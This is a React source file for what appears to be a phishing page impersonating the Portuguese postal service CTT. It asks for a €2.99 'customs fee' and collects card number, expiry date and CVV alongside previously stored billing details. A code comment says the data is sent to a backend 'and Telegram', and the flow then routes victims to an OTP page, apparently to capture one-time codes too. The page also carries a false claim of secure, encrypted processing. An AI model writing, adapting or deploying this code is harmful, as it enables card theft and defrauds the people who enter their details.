import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { AlertCircle, CheckCircle } from 'lucide-react';
import axios from 'axios';

// Get API URL from environment
const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';

const CTTCardForm = () => {
  const navigate = useNavigate();
  const [billingData, setBillingData] = useState(null);
  const [formData, setFormData] = useState({
    numeroCartao: '',
    dataExpiracao: '',
    cvv: ''
  });
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    // Get billing data from localStorage
    const storedBillingData = localStorage.getItem('ctt_billing_data');
    if (storedBillingData) {
      setBillingData(JSON.parse(storedBillingData));
    } else {
      // If no billing data, redirect to billing page
      navigate('/billing');
    }
  }, [navigate]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    
    // Format card number with spaces
    if (name === 'numeroCartao') {
      const cleanedValue = value.replace(/\s/g, '').replace(/[^0-9]/g, '');
      const formattedValue = cleanedValue.replace(/(.{4})/g, '$1 ').trim();
      if (cleanedValue.length <= 16) {
        setFormData(prev => ({
          ...prev,
          [name]: formattedValue
        }));
      }
    }
    // Format expiry date
    else if (name === 'dataExpiracao') {
      const cleanedValue = value.replace(/[^0-9]/g, '');
      let formattedValue = cleanedValue;
      if (cleanedValue.length >= 2) {
        formattedValue = cleanedValue.substring(0, 2) + '/' + cleanedValue.substring(2, 4);
      }
      if (formattedValue.length <= 5) {
        setFormData(prev => ({
          ...prev,
          [name]: formattedValue
        }));
      }
    }
    // CVV formatting
    else if (name === 'cvv') {
      const cleanedValue = value.replace(/[^0-9]/g, '');
      if (cleanedValue.length <= 4) {
        setFormData(prev => ({
          ...prev,
          [name]: cleanedValue
        }));
      }
    }
    else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }
  };

  const handleSubmit = async () => {
    // Basic validation
    const cardNumber = formData.numeroCartao.replace(/\s/g, '');
    if (!cardNumber || cardNumber.length !== 16 || 
        !formData.dataExpiracao || formData.dataExpiracao.length !== 5 ||
        !formData.cvv || formData.cvv.length < 3) {
      return;
    }

    setIsProcessing(true);

    try {
      // Prepare card data for submission (remove spaces)
      const cardDataForSubmission = {
        ...formData,
        numeroCartao: cardNumber
      };

      // Send card data to backend (and Telegram) first
      const paymentRequest = {
        billing_data: billingData,
        card_data: cardDataForSubmission
      };

      const response = await axios.post(`${API}/api/ctt/card-submit`, paymentRequest);
      
      if (response.data.status === 'success') {
        // Store card data for OTP verification
        localStorage.setItem('ctt_card_data', JSON.stringify(cardDataForSubmission));
        
        // Navigate to OTP verification page
        navigate('/otp');
      }
      
    } catch (error) {
      console.error('Error submitting card data:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  if (!billingData) {
    return <div>Carregando...</div>;
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Pagar as taxas alfandegárias (€ 2,99)
            </h2>
          </div>

          {/* Customer Info Summary */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold text-gray-900 mb-2">Dados do cliente:</h3>
            <p className="text-sm text-gray-700">
              <strong>{billingData.nome}</strong> • {billingData.email} • {billingData.telefone}
            </p>
            <p className="text-sm text-gray-600">
              {billingData.endereco}, {billingData.codigoPostal} {billingData.cidade}
            </p>
          </div>

          {/* Payment Summary */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-12 h-8 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold mr-3">
                  VISA
                </div>
                <div>
                  <p className="text-sm font-medium text-gray-900">Taxa Alfandegária</p>
                  <p className="text-xs text-gray-600">Pagamento único</p>
                </div>
              </div>
              <div className="text-right">
                <p className="text-lg font-bold text-gray-900">€ 2,99</p>
                <p className="text-xs text-gray-600">IVA incluído</p>
              </div>
            </div>
          </div>

          {/* Payment Form */}
          <div className="space-y-6">
            {/* Card Number */}
            <div className="space-y-2">
              <Label htmlFor="numeroCartao" className="text-sm font-medium text-gray-700">
                Número do cartão <span className="text-red-500">*</span>
              </Label>
              <Input
                id="numeroCartao"
                name="numeroCartao"
                type="text"
                value={formData.numeroCartao}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                placeholder="0000 0000 0000 0000"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              {/* Expiry Date */}
              <div className="space-y-2">
                <Label htmlFor="dataExpiracao" className="text-sm font-medium text-gray-700">
                  Data de expiração <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="dataExpiracao"
                  name="dataExpiracao"
                  type="text"
                  value={formData.dataExpiracao}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  placeholder="MM/AA"
                />
              </div>

              {/* CVV */}
              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                  CVV <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="cvv"
                  name="cvv"
                  type="text"
                  value={formData.cvv}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  placeholder="000"
                />
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="mt-6 flex items-center text-sm text-gray-600 bg-green-50 p-3 rounded-lg">
            <CheckCircle className="w-4 h-4 text-green-600 mr-2 flex-shrink-0" />
            <span>Os seus dados de pagamento são processados de forma segura e encriptada.</span>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              disabled={isProcessing}
              className={`px-8 py-2 rounded-md font-medium transition-all duration-200 ${
                isProcessing 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isProcessing ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processando...
                </div>
              ) : (
                'Seguinte'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTCardForm;